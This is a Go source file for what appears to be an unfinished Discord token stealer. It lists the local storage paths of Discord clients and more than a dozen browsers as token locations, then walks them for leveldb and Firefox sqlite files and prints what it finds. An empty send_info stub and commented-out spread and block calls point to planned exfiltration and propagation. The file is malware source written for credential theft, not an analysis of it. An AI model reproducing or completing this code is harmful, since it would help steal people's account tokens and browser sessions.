package main

import (
	"fmt"
	"io/fs"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

var tokens []string

func main() {
	start()
	send_info()
	// go spred()
	// go block_dc()

}

func send_info() {

}

func start() {
	appdata, _ := os.UserConfigDir()
	localappdata, _ := os.UserCacheDir()
	locations := []string{}

	// Token locations
	locations = append(locations, appdata+"\\discord\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\discordcanary\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\discordptb\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Lightcord\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Mozilla\\Firefox\\Profiles")
	locations = append(locations, localappdata+"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Yandex\\YandexBrowser\\User Data\\Default")
	locations = append(locations, localappdata+"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Default")
	locations = append(locations, localappdata+"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\")

	for _, location := range locations {
		if _, err := os.Stat(location); os.IsNotExist(err) {
			continue
		}
		if strings.Contains(location, "Mozilla") {
			for _, filepath := range get_files(location, ".sqlite") {
				r := regexp.MustCompile("image")
				file, _ := os.Open(filepath)
				data, _ := ioutil.ReadAll(file)
				for _, match := range r.FindAllStringSubmatch(string(data), -1) {
					fmt.Println(match)

				}
			}
		}
		if strings.Contains(location, "cord") {
			for _, file := range get_files(location, ".ldb") {
				fmt.Println(file)
			}
		}

	}

}

func get_files(root, ext string) []string {
	var a []string
	filepath.WalkDir(root, func(s string, d fs.DirEntry, e error) error {
		if e != nil {
			return e
		}
		if filepath.Ext(d.Name()) == ext {
			a = append(a, s)
		}
		return nil
	})
	return a
}
